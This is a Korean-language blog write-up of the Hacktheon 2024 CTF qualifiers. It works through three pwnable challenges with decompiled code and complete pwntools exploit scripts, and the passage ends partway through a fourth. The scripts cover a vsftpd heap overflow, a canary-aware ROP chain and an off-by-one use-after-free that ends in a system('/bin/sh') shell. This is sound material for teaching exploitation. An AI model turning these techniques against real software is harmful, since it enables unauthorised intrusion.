---
title: 2024 Hacktheon 예선전 풀이
description: 2024 핵테온 세종 사이버보안 경진대회 예선 풀이입니다.
date: 2024-07-01 02:17:33 +0900
author: hacktheon2024
tags: [Tech,CTF]
categories: [Tech, CTF]
comments: false
math: true
mermaid: false
pin: false
image: /assets/img/hacktheon2024/hecktheon2024_thumbnail.png
---

## 목차

1. Pwnable - Finddiff
2. Pwnable - Intelitigation
3. Pwnable - Account
4. Pwnable - chainrpc
5. Web - Revact
6. Web - GithubReadme
7. Web - DogGallery
8. Reversing - Decrypt Message 1
9. Reversing - Decrypt Message 2
10. Forensic - PNG
11. Forensic - Rumor1
12. Forensic - Rumor2
13. Forensic - Rumor3
14. Forensic - Rumor4
15. Forensic - Rumor5
16. Forensic - Tracker1
17. Forensic - Tracker2
18. Forensic - Tracker3
19. Misc - MS office
20. Misc - Confidential
21. Misc - stegoART

---

## 1. Pwnable - Finddiff

기본적으로 `vsftp`, `vvsftp`라는 두 개의 바이너리를 제공해줍니다. 문제의 이름과 제공된 파일에서 눈치챌 수 있듯이, binary diffing을 통해 실제 파일과 문제를 위해 제공된 파일의 차이로 취약점을 찾아내는 문제입니다.

우선 바로 diffing을 시도해봅시다. IDA의 `bindiff`라는 툴 혹은 `diaphora`를 이용해서 diffing을 진행할 수 있습니다. 저는 diaphora라는 툴을 통해 diffing해보겠습니다.
![diffing](/assets/img/hacktheon2024/diffing.png)


결과를 확인해보면, `getFlag`라는 함수가 추가된 것을 볼 수 있습니다. (이외의 함수들은 큰 의미가 없습니다.) 

```c
void __cdecl __noreturn getFlag()
{
  int fd; // [rsp+Ch] [rbp-34h]
  char flag[32]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fd = open("flag", 0);
  memset(flag, 0, sizeof(flag));
  read(fd, flag, 0x20uLL);
  printf("500 OOPS: %s\n", flag);
  exit(1);
}
```
함수를 분석해보니, 그냥 flag를 읽어 출력해주는 함수입니다. 우리는 이 함수를 호출하는 방법을 찾아야 합니다. 그래서 cross-reference를 진행해보면 `init_connection`이라는 함수 내에서 reference가 있음을 확인할 수 있습니다.

```c
void __cdecl __noreturn init_connection(vsf_session *p_sess)
{
  signal(11, getFlag);
  if ( tunable_setproctitle_enable )
    vsf_sysutil_setproctitle("not logged in");
  vsf_cmdio_set_alarm(p_sess);
  check_limits(p_sess);
  if ( tunable_ssl_enable && tunable_implicit_ssl )
    ssl_control_handshake(p_sess);
  if ( tunable_ftp_enable )
    emit_greeting(p_sess);
  parse_username_password(p_sess);
}
```
함수를 확인해보니, 맨 첫 줄에서 signal함수를 통해 `Segmentation Fault` signal이 발생한 경우 `getFlag`함수가 호출되게끔 설정된 것을 알 수 있습니다.

사실 segmentation fault는 쉽게 트리거할 수 있지만(문제 난이도도 아주 쉽다고 설명에 적혀있었기 때문에 유추할 수 있는 부분이었습니다.), diffing을 진행한 결과에 있는 함수들에서는 어떤 함수로 이를 트리거 해야할지 판단하기 어렵습니다. 때문에 저의 경우에는 `strace` 명령어를 통해 입력을 하는 부분들을 따라가보기로 했습니다.
![strace](/assets/img/hacktheon2024/syscall_tracing.png)
확인해보면 유저의 입력 이후에 `"Please login with USER and PASS."`라는 string을 출력해줌을 알 수 있었고, 이 string을 기반으로 입력을 시작하는 부분을 분석했습니다.
```c
void __cdecl __noreturn parse_username_password(vsf_session *p_sess)
{
  while ( 1 )
  {
    while ( 1 )
    {
      vsf_cmdio_get_cmd_and_arg(p_sess, &p_sess->ftp_cmd_str, &p_sess->ftp_arg_str, 1);
      ...
      else
      {
        ...
        else if ( !str_isempty(&p_sess->ftp_cmd_str) || !str_isempty(&p_sess->ftp_arg_str) )
        {
          if ( str_equal_text(&p_sess->ftp_cmd_str, "GET")
            || str_equal_text(&p_sess->ftp_cmd_str, "POST")
            || str_equal_text(&p_sess->ftp_cmd_str, "HEAD")
            || str_equal_text(&p_sess->ftp_cmd_str, "OPTIONS")
            || str_equal_text(&p_sess->ftp_cmd_str, "CONNECT") )
          {
            vsf_cmdio_write_exit(p_sess, 500, "HTTP protocol commands not allowed.", 1);
          }
          if ( ++p_sess->prelogin_errors > 10 )
            vsf_cmdio_write_exit(p_sess, 500, "Too many errors.", 1);
          vsf_cmdio_write(p_sess, 530, "Please login with USER and PASS.");
        }
        ...
      }
    }
    ...
  }
}
```
코드를 확인해보면, `vsf_cmdio_get_cmd_and_arg`함수에서 입력을 받고, 여러 if condition을 거친 이후에 `vsf_cmdio_write(p_sess, 530, "Please login with USER and PASS.");` 구문이 실행되었다는 것을 알아낼 수 있습니다.
```c
void __cdecl vsf_cmdio_get_cmd_and_arg(vsf_session *p_sess, mystr *p_cmd_str, mystr *p_arg_str, int set_alarm)
{
  int ret; // [rsp+2Ch] [rbp-4h]

  if ( set_alarm )
    vsf_cmdio_set_alarm(p_sess);
  ret = control_getline(p_cmd_str, p_sess)
  ...
}
```

`vsf_cmdio_get_cmd_and_arg`함수는 `control_getline`함수로 입력을 받는 것을 확인할 수 있고..

```c
int __cdecl control_getline(mystr *p_str, vsf_session *p_sess)
{
  unsigned int len; // [rsp+18h] [rbp-8h]
  int ret; // [rsp+1Ch] [rbp-4h]

  if ( !p_sess->p_control_line_buf )
    vsf_secbuf_alloc(&p_sess->p_control_line_buf, 0x1000u);
  ret = ftp_getline(p_sess, p_str, p_sess->p_control_line_buf);
}

```

또 그 함수 내부에서는 `ftp_getline`을 호출함을 알 수 있습니다.

```c
int __cdecl ftp_getline(vsf_session *p_sess, mystr *p_str, char *p_buf)
{
  int ret; // [rsp+2Ch] [rbp-14h]
  int (*p_peek)(vsf_session *, char *, unsigned int); // [rsp+30h] [rbp-10h]
  int (*p_read)(vsf_session *, char *, unsigned int); // [rsp+38h] [rbp-8h]

  if ( p_sess->control_use_ssl && p_sess->ssl_slave_active )
  {
    priv_sock_send_cmd(p_sess->ssl_consumer_fd, 4);
    ret = priv_sock_get_int(p_sess->ssl_consumer_fd);
    if ( ret >= 0 )
      priv_sock_get_str(p_sess->ssl_consumer_fd, p_str);
    return ret;
  }
  else
  {
    p_peek = plain_peek_adapter;
    p_read = plain_read_adapter;
    if ( !p_sess->control_use_ssl )
      return str_netfd_alloc(p_sess, p_str, 10, p_buf, 0x4000u, p_peek, p_read);
    p_peek = ssl_peek_adapter;
    p_read = ssl_read_adapter;
    return str_netfd_alloc(p_sess, p_str, 10, p_buf, 0x4000u, p_peek, p_read);
  }
}
```

마지막으로, `ftp_getline`함수를 분석해보면, `plain_peek/read_adapter`함수를 통하여 peek, read를 진행하는 것을 알 수 있습니다.

이 부분을 vsftpd 바이너리와 vvsftpd 바이너리를 따로 열어 분석해보면 `str_netfd_alloc`함수의 `max_len`인자가 vsftpd 바이너리는 `0x1000`이지만 vvsftpd 바이너리는 지금 보이는 것처럼 `0x4000`인 것을 확인할 수 있습니다.
그리고 다시 앞으로 돌아가 `control_getline`함수를 보게되면 `vsf_secbuf_alloc`함수를 통해 우리의 입력 버퍼를 0x1000만큼 할당했음을 알 수 있습니다.

즉, 문제로 제공된 바이너리에서는 `str_netfd_alloc`함수 내부에서 plain_read_adapter함수를 통해 입력을 받을 때, `0x1000`만큼 할당된 공간에 `0x4000`만큼의 입력을 받게되어 간단하게 heap overflow를 발생시킬 수 있음을 알 수 있습니다!

remote와의 설정차이 때문에, local에서는 flag가 출력되지 않아서, child process에 strace를 attach하고 결과를 확인해보면...
![getFlag](/assets/img/hacktheon2024/getFlag.png)

위와같이 flag를 open하는 것을 확인할 수 있습니다!

```python
from pwn import *

#p = remote('13.125.107.131', 5000, level='debug')
p = remote('0', 21, level='debug')

p.sendline('USER anonymous')
pause()
p.sendline(b'A'*0x1000)

p.interactive()
```

분석에는 시간이 좀 걸렸지만, 실제로 바이너리에 0x1000 이상 크기의 버퍼를 입력하게 되면 `flag`를 획득할 수 있는 간단한 문제였습니다.

## 2. Pwnable - Intelitigation

해당 문제에서 nc로 접속하면 Base64형식을 복호화해주면 바이너리를 획득할 수 있고, 해당 바이너리를 exploit하는 방식이다.

nc 접속해서 바이너리를 받아올 때 매번 data 영역의 idx와 canary 값들이 바뀐다. data영역의 주소는 그대로다.
![](/assets/img/hacktheon2024/go3.png)

.init_array 섹션에 아래 함수들이 존재하는데, 랜덤한 카나리 값과 idx의 canary 값을 가져오고, 세팅해준다.
```c
__int64 sub_12D9()
{
  return canary[idx];
}
```

sub_12D9에서 받은 카나리 값을 fs:0x28의 canary에 직접 써서 값을 변경해주는 부분이다.
```c
unsigned __int64 __fastcall sub_12BD(unsigned __int64 a1)
{
  unsigned __int64 result; // rax

  result = a1;
  __writefsqword(0x28u, a1);
  return result;
}
```

main 로직에서는 Buffer Overflow가 발생해 pie주소 leak이 가능했고, canary값을 알고 있으므로 ROP를 수행할 수 있다.

```c
unsigned __int64 sub_1324()
{
  __int64 buf[2]; // [rsp+0h] [rbp-210h] BYREF
  char v2[496]; // [rsp+10h] [rbp-200h] BYREF
  unsigned __int64 v3; // [rsp+208h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("input> ");
  buf[0] = 0LL;
  buf[1] = 0LL;
  memset(v2, 0, sizeof(v2));
  read(0, buf, 0x300uLL);
  printf("Your input> ");
  printf("%s", (const char *)buf);
  return v3 - __readfsqword(0x28u);
}
```

open, read, write해주는 함수가 존재했다. 해당 함수를 이용해서 flag파일을 읽으면 될 것으로 판단했다.
```c
ssize_t __fastcall sub_124E(const char *a1)
{
  int fd; // [rsp+1Ch] [rbp-4h]

  fd = open(a1, 0);
  read(fd, &unk_40C0, 0x64uLL);
  return write(1, &unk_40C0, 0x64uLL);
}
```

ROP Gadget중 `mov rdi, rsp ; pop r8 ; ret`를 활용해 rdi 레지스터를 세팅할 수 있었고, sub_124E를 호출해주면 된다.

```py
from pwn import *
import base64

p = remote('hto2024-nlb-fa01ec5dc40a5322.elb.ap-northeast-2.amazonaws.com',5001)
p.recvline()
p.recvline()
data = base64.b64decode(p.recvline().strip())

with open('binary.bin','wb') as f:
    f.write(data)
    e = ELF("./binary.bin")
    idx = ord(e.read(0x0000000000004070, 1))
    canary = e.read(0x0000000000004020+(idx*8), 8)

    pay = b'A'*520 + canary + b'B'*8 + b'\xf2'
    p.send(pay)
    p.recvuntil(b'B'*8)
    
    pie_leak = u64(b'\x00'*1+p.recv(6)[1:]+b'\x00\x00')
    print(hex(pie_leak))
    pie_base = pie_leak - 0x1300
    print(hex(pie_base))

    # 0x00000000000012b4 : mov rdi, rsp ; pop r8 ; ret

    pay2 = b'A'*520 + canary + b'B'*8 + p64(pie_base + 0x00000000000012b4) + b'./flag\x00\x00' + p64(pie_base+0x124E)

    p.send(pay2)

p.interactive()
```

## 3. Pwnable - Account

이 문제는 자체적으로 구성한 간단한 bytecode로 account와 group들을 생성 및 제거할 수 있는 프로그램입니다. 분석은 간단합니다.

해당 바이너리에는 다음 7가지의 기능이 있습니다.
1. add account
2. remove account
3. edit account
4. add group
5. add account in group (그룹에 계정 추가)
6. remove account in group (그룹에서 계정 삭제)
7. print accounts

또한, 입력 포맷은  `| feature(1byte) | args |`의 형태로 이뤄지며 모든 값은 raw value입니다.

`account`는, `unicode type`과 `ascii type`이라는 두 가지의 타입이 존재합니다. 아시다시피 unicode는 한 글자가 2bytes이며, ascii는 1byte라는 차이가 있습니다.

`add account`와 `edit account`를 우선적으로 분석해보겠습니다.
```c
__int64 __fastcall add_acc(char acc_type, char *a2)
{
  char *dest; // [rsp+10h] [rbp-30h]
  account *v4; // [rsp+18h] [rbp-28h]
  int v5; // [rsp+20h] [rbp-20h]
  int v6; // [rsp+20h] [rbp-20h]
  int v7; // [rsp+20h] [rbp-20h]
  int i; // [rsp+24h] [rbp-1Ch]

  for ( i = 0; ; ++i )
  {
    if ( i >= 16 )
    {
      fprintf(stderr, "no more account\n");
      return -1;
    }
    if ( !ACCOUNTS_6050[i] )
      break;
  }
  if ( !acc_type )
  {
    v7 = unicode_len(a2);
    if ( !v7 )
      goto LABEL_7;
    v6 = 2 * (v7 + 1);
    goto LABEL_12;
  }
  if ( acc_type != 1 )
    goto LABEL_11;
  v5 = strlen(a2);
  if ( !v5 )
  {
LABEL_7:
    fprintf(stderr, "invalid length\n");
    return -1;
  }
  v6 = v5 + 1;
LABEL_12:
  v4 = alloc_buf(0x18);
  dest = alloc_buf(v6);
  if ( dest && v4 )
  {
    v4->type = acc_type;
    v4->ref_cnt = 0;
    v4->data = dest;
    if ( !acc_type )
    {
      copy_unicode(dest, a2);
      goto LABEL_20;
    }
    if ( acc_type == 1 )
    {
      strcpy(dest, a2);
LABEL_20:
      ACCOUNTS_6050[i] = v4;
      inc_refcnt(i);
      return i;
    }
LABEL_11:
    fprintf(stderr, "invalid account type\n");
    return -1;
  }
  fprintf(stderr, "failed to allocate memory\n");
  return -1;
}
```
add account함수는 위와 같이 구현되어있습니다.
`ACCOUNTS_6050` 전역변수의 배열에 0~15까지의 모든 index를 순회하며, 할당되지 않은 공간에 account 할당을 시도합니다. 
우리가 입력한 `account type`을 통해 해당 type이 unicode라면, `unicode_len`함수를 통해 길이를 구하고, 그 값에서 1을 더한 값에 2를 곱하여 size를 걸정합니다. ascii type인 경우에는 `strlen(buf)+1`을 반환합니다. 즉, 한 글자 만큼의 여유공간을 남겨둔 상태로 공간을 할당합니다.
그 이후 입력받은 버퍼를 공간에 복사하는데, unicode를 copy를 할 때에는 별도의 함수로 copy를 진행합니다.
`copy_unicode`도 추가적으로 분석해봅시다.

```c
_BYTE *__fastcall copy_unicode(_BYTE *a1, _BYTE *a2)
{
  bool is; // [rsp+17h] [rbp-29h]
  _BYTE *i; // [rsp+20h] [rbp-20h]

  for ( i = a1; ; i += 2 )
  {
    is = 1;
    if ( !*a2 )
      is = a2[1] != 0;
    if ( !is )
      break;
    *i = *a2;
    i[1] = a2[1];
    a2 += 2;
  }
  *i = 0;
  i[1] = 0;
  return a1;
}
```

버퍼를 모두 복사한 이후, 마지막에 null을 한 글자 더 추가함을 알 수 있습니다.

취약점은 `edit account`기능에 존재합니다.

```c
__int64 __fastcall edit_acc(char write_type, unsigned __int8 a2, char *a3)
{
  unsigned int len; // [rsp+Ch] [rbp-24h]
  account *v5; // [rsp+10h] [rbp-20h]

  if ( a2 < 0x10u )
  {
    v5 = ACCOUNTS_6050[a2];
    if ( v5 )
    {
      if ( v5->type )
      {
        if ( v5->type != 1 )
        {
LABEL_8:
          fprintf(stderr, "unexpected\n");
          return -1;
        }
        len = strlen(v5->data) + 1;
      }
      else
      {
        len = 2 * (unicode_len(v5->data) + 1);
      }
      if ( !write_type )
      {
        if ( 2 * unicode_len(a3) >= len )
          goto LABEL_12;
        copy_unicode(v5->data, a3);
        v5->type = 0;
        goto LABEL_17;
      }
      if ( write_type == 1 )
      {
        if ( strlen(a3) >= len )
        {
LABEL_12:
          fprintf(stderr, "invalid length\n");
          return -1;
        }
        strcpy(v5->data, a3);
        v5->type = 1;
LABEL_17:
        print_val(v5);
        return 0;
      }
      goto LABEL_8;
    }
  }
  fprintf(stderr, "invalid account id\n");
  return -1;
}
```

함수를 분석해보면, 이전에 우리가 할당한 account의 타입이 unicode든 ascii든 상관없이 원하는 type대로 값을 edit할 수 있습니다. 하지만 길이 검사를 할당된 type에 따라 진행하여, 입력 버퍼와의 길이를 비교한 후 복사를 진행합니다.

여기서 우리는 취약점을 발생시킬 수 있습니다.

만약 우리가 ascii type의 0x18만큼의 글자 길이를 가지는 account를 하나 생성했다고 가정해봅시다. 그럼, buffer는 0x19만큼 공간할당이 됩니다.

이 때, 우리가 해당 account를 unicode type으로 edit을 한다면 어떻게 될까요?
만일 우리가 unicode type으로 12글자, 즉 24(0x18)bytes만큼을 입력하게 된다면, 앞서 할당된 0x19bytes의 공간 제한은 통과하게 되지만 0x18bytes를 복사한 이후 2bytes의 null byte를 채워넣는 로직에 의해 1byte의 `off-by-one` 취약점이 발생하게 됩니다.
즉, 아래와 같은 상태가 됩니다.

![offbyone](/assets/img/hacktheon2024/1.png)


이 바이너리에는 다양한 구조체들이 존재하며, 그 값들이 raw value 저장 및 구분되기 때문에, 이 off-by-one 취약점으로 인해 구조체들의 변조가 가능해집니다.

(주요 구조체들은 아래와 같이 구성되어있습니다.)
```c
struct account
{
  _BYTE type;
  _BYTE ref_cnt;
  char *data;
  _QWORD c;
};
struct group
{
  _DWORD acc_cnt;
  account **accs;
  void *vtable;
};
```

구조체 변조 이후에는 원하는 exploit plan을 세워서 마무리하면 됩니다.

제 exploit 과정은 아래와 같습니다.
1. memory map leak <ol type="I"><li>두 개의 ascii account를 할당</li><li>off-by-one 취약점을 통해, 두 번째 ascii account를 unicode type으로 변조</li><li>하나의 추가적인 큰 크기를 가진 ascii account를 할당</li><li>그룹 생성 및 큰 크기의 account를 그룹에 추가</li><li>변조된 두 번째 account를 통해 그룹에 추가된 account의 reference count를 1로 조작</li><li>그룹에서 account를 삭제하면, reference count가 0이 되므로 할당 해제되지만 account 배열 전역변수에는 존재</li><li>uaf를 통해 값 할당 이후 해당 값을 읽어들이면 memory leak.</li></ol>
2. 위와 비슷한 과정을 반복하여 AAR, AAW를 획득
3. `environ leak`
4. `stack ROP`

위 과정을 거치며 shell을 획득할 수 있습니다.

```python
from pwn import *
from time import sleep
e = ELF('./account')
p = e.process(aslr=True)

sla = p.sendlineafter
sa = p.sendafter

def add_acc(_type, pay):
    p.send(b'\x00' + p8(_type) + pay + b'\x00')
    sleep(0.3)

def remove_acc(uid):
    p.send(b'\x01' + p8(uid))
    sleep(0.3)

def edit_acc(uid, _type, pay):
    p.send(b'\x02' + p8(uid) + p8(_type) + pay + b'\x00')
    sleep(0.3)

def add_grp():
    p.send(b'\x10\0\0\0\0')
    sleep(0.3)

def remove_grp(gid):
    p.send(b'\x11'+p8(gid))
    sleep(0.3)

def add_acc_in_grp(gid, uid) :
    p.send(b'\x12' + p8(gid) + p8(uid))
    sleep(0.3)

def remove_acc_in_grp(gid, uid):
    p.send(b'\x13' + p8(gid) + p8(uid))
    sleep(0.3)

def print_all(gid):
    p.send(b'\x14' + p8(gid))
    sleep(0.3)


add_grp()
add_acc(1, b'A'*0x18)           # 0
add_acc(1, b'ipwnnn')           # 1
edit_acc(0, 0, b'A'*0x17)

add_acc(1, b'B'*0x7f)           # 2
add_acc_in_grp(0, 2)
edit_acc(1, 0, b'ipwnnnA\1\1')
remove_acc_in_grp(0, 2)
add_grp()
add_acc_in_grp(1, 0)
add_acc_in_grp(0, 2)

print_all(0)
p.recvuntil(b'\x98')
maps = u64(b'\x98' + p.recv(5) + b'\0\0') - 0x98
log.info('[MAPS] %#x'%maps)

add_acc(1, b'A'*0x18)           # 3
add_acc(1, b'A'*0x6)            # 4
add_acc(1, b'A'*0x17)           # 5

edit_acc(3, 0, b'A'*0x17)
add_acc_in_grp(0, 5)
edit_acc(4, 0, b'A'*0x6 + b'\0\1\1')
remove_acc(4)
remove_acc_in_grp(0, 5)
add_acc(1, b'A'*0x17)           # 4
add_acc_in_grp(0, 5)
edit_acc(4, 1, b'\x01'*0xf)
edit_acc(4, 1, b'\x01'*8 + p64(maps + 0x10))

p.recvuntil(b'\x01'*8)
p.recvuntil(b'\x01'*8)
p.recv(7)
print_all(0)
p.recv(6)
pie = u64(p.recv(6) + b'\0\0') - 0x6010
log.info('[PIE] %#x'%pie)

edit_acc(4, 1, b'\x01'*8 + p64(pie + 0x5f70))
print_all(0)
p.recvuntil(b'\x01'*8)
p.recv(13)
libc = u64(p.recv(6) + b'\0\0') - 0x19ecb0
log.info('[GLIBC] %#x'%libc)

prdi = libc + 0x16da6b
system = libc + 0x50d70
binsh = libc + 0x1d8678

edit_acc(4, 0, b'\0' + b'\x01'*7 + p64(libc + 0x2221ff))
print_all(0)
stack = u64(p.recvuntil(b'\x7f')[-6:] + b'\0\0') - 0x250
log.info('[STACK] %#x'%stack)

edit_acc(4, 0, b'\x01'*8 + p64(pie + 0x6150))
print_all(0)
p.recvuntil(b'\x01'*8)
p.recv(13)
heap = u64(p.recv(6) + b'\0\0') - 0x2a0
log.info('[HEAP] %#x'%heap)

edit_acc(4, 0, b'\x01'*8 + p64(heap + 0x2f4))
edit_acc(5, 1, b'\xf0')
edit_acc(4, 0, b'\x01'*8 + p64(heap + 0x2f8))
edit_acc(5, 1, p64(stack -1))
edit_acc(4, 0, b'\x01'*8 + p64(heap + 0x2f0))
edit_acc(5, 1, b'\x02')
pause()
pay = b''
pay += b'\0' + p64(prdi+1) + p64(prdi) + p64(binsh) + p64(system)
pay = pay.ljust(0xee, b'A')
add_acc(0, pay)

p.interactive()
```

로직을 열심히 분석하지 않으면 놓칠 수 있는 취약점이기 때문에 처음 해킹대회를 입문하는 사람들이 풀어내기에는 어려울수도 있는 문제였다고 느껴지네요 :)

## 4. Pwnable - chainrpc

이 문제는 golang을 통해 blockchain rpc 를 구현해둔 문제입니다.

일반적으로 golang binary를 하나하나 전부 분석하기에는 상당히 많은 시간과 노력이 들기에, 가능한 적은 분석으로 문제를 푸는 방법을 소개할 예정입니다.


먼저 binary를 분석하기 앞서, symbol이 다 날라가있는 상태라 분석이 어렵습니다. 이 때 ida 의 lumina 혹은 https://github.com/SentineLabs/AlphaGolang 같은 도구를 사용해서 symbol을 복구하고 시작합니다.



바이너리를 분석을 시작할 때, 악성코드 문제등이 아닌경우 실행시켜보는것이 가장 쉽게 접근할 수 있습니다.

![img](/assets/img/hacktheon2024/z.png)

다음과 같이 실행을 해보면 입력을 받고, 해당 입력이 JSON 으로 되어야 한다는 사실 및 args 라는 key를 가져야 한다는 사실을 알 수 있습니다.



golang binary 경우 string에 의미있는 내용이 남아있을 확률이 높습니다. (golang structure, function definition, ...)

또한 golang에서 JSON 을 parsing 하기 위해서는 struct를 작성해주어야 하는데, 이를 string에서 찾아볼 수 있습니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUfbnVLU8Lazq6iXOZyfrEGXaEthJL1IM0XAh29W1Iyg01VdEDlhoFRRbe6QcScbh_XRnv7UGO2Lo4-7KogwPvmJGdF0HHmQR72RsL-gZ8vQT5uOhDr3ePMU6_uNuUeLRnrL9u8DayFCoNGicrVn9ddGWKjUW4JX=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

이 때 vjson이라는 문장이 해당 structure를 구분할 수 있는 값이라 생각하고, 해당 값을 검색함으로 JSON의 필요한 field를 알 수 있습니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUcL_COfpnP419x4cmrX8vus_B0H06a3hEQJvOm5NOEviFyPsoUUr5cYJ__q0_dHvWEKwtdATUbqUrz-G2T0-Y7H9M0sca0MWcmB5RZSIHQkSmmG7fVxR1ZuMfXAOyKv9Pi4D9NT0nWFW871-grycI_Ah2HpieMT=s2048?key=iBB5N8FSRKchO_hzOd9DYw)



또한 해당 문제의 경우 nc 서버를 제공하였는데, reversing 문제에서 nc 서버를 제공해주는 경우는 flag 파일을 읽는 routine이 바이너리 내에 존재할 확률이 큽니다.

하지만 일반적인 ida string search 설정상으로는 flag 문자열이 보이지 않아, 설정을 통해 최소 검색 길이를 맞춰주어야 합니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUdOV--smt6O3lLuPdTcPWPxu8H3FIlra1JpUOp9IYVZ_ifU0qDbh4tSoOnT0hOBXujfLC-YWneePm4sT4wXWtw_TueLBCjAFb8zUZb7CJIYtS0wurjP5Ya7P2oacfjN6NjxLbfCli5gv8WtRs7N4Tpf-RZOWCjU=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

맞춰 주게 되면 아래와 같이 검색이 가능한데, 이를 xref 를 통해 어디서 사용하는지 확인할 수 있습니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUe1N6GSAbfg_yOuhkmyR2Ikf0z7HrS1vLoko5jf2HaHLoVRpFxapbGMUqpIsjrgefxSYEITG8768Rot6qmciOy06zBadRBEdPOBDSWDoE2e5hjPsoRBN9YC0_5IcYNO7wTeM-DFR8RdgNEcySmYaMoHhu6K3qk=s2048?key=iBB5N8FSRKchO_hzOd9DYw)



![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUd4YlhTw0fbzii3aC3nj4anHqHHfv9S_9at_UQqJoBiaLPlNNvBBOZ2OVSjlvAyNyLAENKyjbgu1lSn7lq659HLFoQ-MJ0Xo85Sg8ooZKtcVAxpsQszKHtR_nUpT1iH7ytDd2qY-UPBmuZ2NtLBTWPbhZzrCwb0=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

확인을 해보면 `math_big__Int_Cmp` 를 통해 특정 값과 비교 후 flag를 출력해주는 routine으로 가는걸 알 수 있습니다.



현재까지 알아낸것을 정리하면 아래와 같습니다.

1. 입력은 `{“type”: .., “args”: .., “from”: .., “hash”: ..}` 이다.
2. 특정 검사 이후 flag를 읽어주는 routine이 있다.



1번 내용을 조금 더 깊게 팔 이유가 있기에, 해당 부분을 임의 값을 채워서 입력해봅니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUcqNaG1e1XsTcJDBE5QoCFSpij-cB1arW3589otuhitr30AOh5htTVcLFwT37wSdU2Zag65HSdBk749SfQrtAM2Yo1Sew8V4oi2JUC60dTZmDVMEVkujLgs6YQEmBIx5VL8pH3TyW8YvaZUR_IFE2dy1n1KYPQo=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

위 사진에서 type이 특정 type 이어야 한다는걸 알 수 있고, 여러가지를 넣다보면 숫자가 들어갔을 때 에러없이 정상적으로 실행되는걸 볼 수 있습니다.



여기까지 시작할 때 분석 없이 알아낼 수 있는 대부분을 알아내었습니다. 이 이후에는 크게 두가지 정도가 있는데, 

1. 바이너리를 하나하나 분석하기
2. 조금 더 분석 없이 알아내기 

정도를 진행해볼 수 있습니다. 저는 2번을 통해 진행하였습니다.



type이 숫자임을 알아냈기에, 1에서 시작해서 하나하나 넣어보며 진행합니다. 넣다보면 아래와 같이 파악할 수 있습니다.

```
1 ⇒ 어떤 account 를 출력
2 ⇒ not implement error 를 출력
3 ⇒ args file를 읽어서 출력
4 ⇒ 파악 불가
5 ⇒ 파악 불가
6 ⇒ 파악 불가
7 ⇒ 어떤 hash를 출력
```



여기서 3번을 보면 파일을 읽어주네? 하면 flag를 읽는 시도를 안해볼수가 없습니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUfAoAoy3KuiG881k6F9jl3j540o7Ku036KOYAukGJ0MVMsLo7D2tR5_BmQMBDn9f2Ep3jGuXZQynNeCmdcOx7G-0p1GjwvGJiHeQbksJpnqiAvDnxJLVXQuqs3S3x1jLjo-_BkNattWhzcvl0swIX7u8FC5_563=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

당연히 실패합니다. 하지만 `Loading blockchain from file` 이라는 문구를 통해 특정 config를 읽어온다 생각할 수 있겠습니다. (실제로 config가 주어졌지만, remote에는 해당 파일이 없음으로 해당 기능은 의미가 없다 생각하고 진행하겠습니다.)



2번에서 not implement error 를 출력하는것을 토대로 대략적인 routine 시작점을 짚어낼 수 있습니다.

아까와 같이 string 검색 후 이를 xref 찍음으로써 다음과 같이 확인 가능합니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUcVozdz4BeF2Glo2Kksd9qzj69qYfw00n_qiK2LlzkOV7gseLfOd1BV6G2dUcHjR79DUilQ6Nz8pjuRZ4nVNfYaOVs6PkegkKRrGXzAFcves5DhRJl2zuCmdpFf5wSOm59sLB6aAiVtvUR5P9yhjLBLq9HO3yCk=s2048?key=iBB5N8FSRKchO_hzOd9DYw)



해당 CFG를 탐색하다보면 대략 저부분이 routine 인걸 알 수 있고, flag를 출력해주는 함수도 저 함수를 통해 가게 됩니다.

flag 를 출력해주는 함수에서 Sending transaction을 출력해주는데, 이쪽을 먼저 호출하는것을 목표로 합니다.

아까 탐색했던 type에서 4,5,6 번이 파악 불가였음으로 해당 부분을 위주로 아까처럼 손으로 값을 임의로 넣어봅니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUelC4b-vFp5cKyFtQjoKGkgzpgwY0KWyWlhUrF467hqes-AL05RC6JaUMxhK0h94OzjTV0un_7azbCCUMKc4gFBJDkgu3STEEo-du-04O3F5qmBX5gUU0SSeiVxSo-2eRsJjoQLXC1CG-E5NpZlaYz9psd0XhMV=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

위와 같이 뜨게 되는데, 4번은 잘 모르는 값, 5번이 정상적으로 실행은 되지 않습니다.

5번의 경우 invalid account 라고 나오게 되는데, 주어진 config 파일에 account 관련된 부분이 있음 (account.json)으로 args에 해당 값을 넣어봅니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUdXuEGzaYJjgBh9O3NnnqB-2R53WYX2_4kSK9TGD1ajMY58cv5fmgdtU3nh2euiy3WILZ1djQHgUc_--IqfgvxR4oYTwH48GW0sx_pYRNqtcvRU0Ek9Uwj4NwnT1NRPoCqneaia6Ov3ZSlfKhXLI_BGAAnwT9w8=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

그러면 blockchain not initialized 로 나오는 에러가 바뀌게 됩니다. 

그럼 blockchain을 초기화 해주어야 하는데, 4, 6 번이 현재 사용처가 마땅치 않음으로 해당 type을 대상으로 주어진 파일(blockchain.json)을 인자로 넣어 진행해봅니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUfLxdDajYNOkMIQTkXbT4ps6_JLBFYhY_q8Q8hU7Wq6f30iu9JQZdOB2MSCwMF7v2AMXWPWM5Fk4jsd1I9MIqZKt1IvhK3sl5kPfqB01DpnItA8cJzaEvCsDnhwIEYJU0F5Cg70NI5WGz1KeCLmrccYaN-r0vo7=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

